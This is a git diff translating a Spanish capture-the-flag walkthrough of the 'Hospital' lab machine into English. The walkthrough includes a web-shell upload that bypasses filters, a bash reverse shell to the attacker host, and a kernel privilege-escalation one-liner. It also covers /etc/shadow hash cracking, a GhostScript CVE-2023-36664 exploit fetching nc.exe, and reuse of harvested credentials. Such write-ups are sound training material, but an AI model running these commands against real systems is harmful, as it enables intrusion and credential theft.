@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We'll start with a port scan using the automatic TCP port scan script I've created:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital]
@@ -123,7 +123,7 @@ Puertos TCP abiertos:
 |_    Message signing enabled and required
 ```
 
->Enumeramos la versión de Windows y el nombre del dominio mediante la herramienta crackmapexec:
+>We list the Windows version and the domain name using the crackmapexec tool:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -131,47 +131,45 @@ Puertos TCP abiertos:
 SMB         10.129.166.40   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
 ```
 
->En el puerto 443 vemos un servicio de RoundCube corriendo:
+>On port 443, we can see a RoundCube service running:
 
 ![image](https://github.com/user-attachments/assets/3dc6e1b4-bfcc-4ac0-a3c4-db1e0254c8d7)
 
->Si vamos a la app web alojada en el puerto 8080 podemos ver un sitio web que permite el registro de usuarios: 
+>If we go to the web app hosted on port 8080, we can see a website that allows users to register:
 
 ![image](https://github.com/user-attachments/assets/60febac9-56f0-4c15-b122-5f23388e6ba7)
 
-> Una vez creamos nuestro usuario y nos logueamos vemos un formulario para la subida de archivos:
+>Once we have created our account and logged in, we will see a form for uploading files:
 
 ![image](https://github.com/user-attachments/assets/6e583142-06fd-478e-ad80-014fdf5cb69b)
 
->Vamos a usar la siguiente web shell: https://github.com/flozz/p0wny-shell/blob/master/shell.php
+>We're going to use the following web shell: https://github.com/flozz/p0wny-shell/blob/master/shell.php
 
-
-
->Abrimos burpsuite e interceptamos la subida del archivo por si hay que realizar evasión de reglas:
+>We open BurpSuite and intercept the file upload in case we need to bypass any rules:
 
 ```bash
 burpsuite &>/dev/null & disown
 ```
 
->Subiendo la shell sin técnicas de evasión da error:
+>Uploading the shell without using evasion techniques results in an error:
 
 ![image](https://github.com/user-attachments/assets/d7749916-a2cd-424a-8453-f31e624e5699)
 
->Si cambiamos la extensión del archivo a .phar y el content-type a image/png nos deja subir la shell:
+>If we change the file extension to .phar and the content-type to image/png, it allows us to upload the shell:
 
 ![image](https://github.com/user-attachments/assets/4788c734-d728-4300-af72-94bfb8ae5f52)
 
->Descubrimos que el archivo se encuentra en el directorio uploads/ y no sufre ningún cambio el nombre del archivo subido, por lo que podemos ejecutar comandos en nuestra web shell:
+>We discovered that the file is located in the uploads/ directory and that the name of the uploaded file remains unchanged, so we can execute commands in our web shell:
 
 ![image](https://github.com/user-attachments/assets/a62079ea-ec49-4160-855e-41a67a7325ea)
 
->Vamos a crear una reverse shell para darnos una shell a nuestra máquina atacante:
+>Let's create a reverse shell to give us a shell on our attacker's machine:
 
 ```bash
 bash -c "bash -i >& /dev/tcp/10.10.14.133/443 0>&1"
 ```
 
-> Creamos un listener y recibimos la shell:
+>We create a listener and receive the shell:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital]
@@ -183,7 +181,7 @@ bash: no job control in this shell
 www-data@webserver:/var/www/html/uploads$ 
 ```
 
->Transformamos la shell a una full TTY:
+>We switch the shell to a full TTY:
 
 ```bash
 script -c bash /dev/null
@@ -201,14 +199,14 @@ www-data@webserver:/var/www/html/uploads$ tty
 
 # Privilege Escalation (Linux)
 
->Si vemos la versión del Kernel podemos ver que es una vulnerable:
+>If we check the kernel version, we can see that it is vulnerable:
 
 ```bash
 www-data@webserver:/home$ uname -a
 Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
->Con el siguiente one-liner podremos obtener una shell como root:
+>With the following one-liner, we can gain a root shell:
 
 ```bash
 www-data@webserver:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
@@ -219,7 +217,7 @@ mkdir: cannot create directory 'm': File exists
 root@webserver:/tmp#
 ```
 
->Si abrimos el /etc/shadow vemos que un usuario tiene su hash SHA512crypt, el cual vamos a crackear:
+>If we open the /etc/shadow file, we can see that a user has an SHA512crypt hash, which we are going to crack:
 
 ```bash
 root@webserver:/root# cat /etc/shadow
@@ -229,7 +227,7 @@ drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW3
 <SNIP>
 ```
 
->Vamos a crackearlo con john empleando como wordlist el rockyou.txt :
+>Let's crack it with John, using rockyou.txt as the wordlist:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital]
@@ -248,13 +246,13 @@ Session completed.
 
 # Lateral Movement
 
->Estas credenciales podremos emplearlas en el servicio alojado en el puerto 443:
+>We can use these credentials with the service running on port 443:
 
 ![image](https://github.com/user-attachments/assets/75bbee70-ea04-45af-9b76-2be4b1062394)
 
->Aquí podemos ver que nos piden un archivo .eps que sea compatible con GhostScript, dato del que nos podemos aprovechar para ganar un mayor acceso al sistema, en este caso aprovecharemos la vulnerabilidad CVE-2023–36664 que permite ejecución de comandos en ghostscript, emplearemos el siguiente exploit: https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
+>Here we can see that we are asked to provide an .eps file that is compatible with GhostScript; we can exploit this to gain greater access to the system. In this case, we will exploit the CVE-2023–36664 vulnerability, which allows command execution in GhostScript, using the following exploit: https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
 
->Creamos un archivo para que descarguen nc.exe desde nuestra máquina atacante:
+>We create a file so that they can download nc.exe from our attacker machine:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital/CVE-2023-36664-Ghostscript-command-injection]
@@ -262,11 +260,11 @@ Session completed.
 [+] Payload successfully injected into file.eps.
 ```
 
->Se lo subimos al drbrown:
+>We've uploaded it to drbrown:
 
 ![image](https://github.com/user-attachments/assets/3fc600fb-b44a-41b4-93ea-30cbb72f3c6b)
 
->Ahora creamos otro archivo .eps que ejecute nc.exe y nos envíe una reverse shell:
+>Now let's create another .eps file that runs nc.exe and sends us a reverse shell:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/Hostpital/CVE-2023-36664-Ghostscript-command-injection]
@@ -275,7 +273,7 @@ Session completed.
 
 ```
 
->Se lo enviamos de nuevo y preparamos el listener:
+>We send it to him again and set up the listener:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/academy_tools]
@@ -290,7 +288,7 @@ C:\Users\drbrown.HOSPITAL\Documents>
 
 # Privilege Escalation Windows
 
->En su escritorio podemos ver la flag user.txt:
+>On his desk, we can see the file user.txt:
 
 ```powershell
 C:\Users\drbrown.HOSPITAL\Desktop>dir
@@ -308,7 +306,7 @@ dir
 
 ```
 
->En el directorio de documentos vemos un script que contiene credenciales:
+>In the documents directory, we can see a script containing credentials:
 
 ```powershell
 C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
@@ -318,7 +316,7 @@ set filename=%~1
 powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
 ```
 
->Si probamos las credenciales vemos que son válidas para el usuario drbrown:
+>If we test the credentials, we can see that they are valid for the user drbrown:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -327,7 +325,7 @@ SMB         10.129.166.40   445    DC               [*] Windows 10 / Server 2019
 SMB         10.129.166.40   445    DC               [+] hospital.htb\drbrown:chr!$br0wn
 ```
 
->Vemos que este usuario pertenece al grupo Remote Managament Users por lo que podemos usar evil-winrm para conectarnos como él en el DC:
+>We can see that this user belongs to the Remote Management Users group, so we can use evil-winrm to log in as them on the DC:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -344,7 +342,7 @@ WINRM       10.129.166.40   5985   DC               [+] hospital.htb\drbrown:chr
 *Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> 
 ```
 
->Ahora vamos a tratar de llevarnos al usuario que está corriendo el XAMPP, por lo que vamos a subir la misma webshell de antes al directorio C:\XAMPP\htdocs:
+>Now we’re going to try to gain access to the user running XAMPP, so we’re going to upload the same webshell as before to the C:\XAMPP\htdocs directory:
 
 ```powershell
 *Evil-WinRM* PS C:\XAMPP\htdocs> upload /home/kali/Desktop/machines/Hostpital/webshell.php
@@ -357,12 +355,12 @@ Info: Upload successful!
 
 ```
 
->Al ir a la webshell nos llevamos la sorpresa de que tenemos una shell como NT AUTHORITY\SYSTEM por lo que simplemente nos traemos una reverse shell con el nc.exe que ya habiamos subido previamente:
+>When we accessed the webshell, we were surprised to find that we had a shell with privileges such as NT AUTHORITY\SYSTEM, so we simply set up a reverse shell using nc.exe, which we had already uploaded previously:
 
 ![image](https://github.com/user-attachments/assets/34e3f597-0535-4f29-9b56-028ade7873e4)
 
 
->Y aquí ya podemos ver la flag root.txt:
+>And here we can already see the flag root.txt:
 
 ```powershell
 PS C:\xampp\htdocs> cd C:\Users\Administrator\Desktop
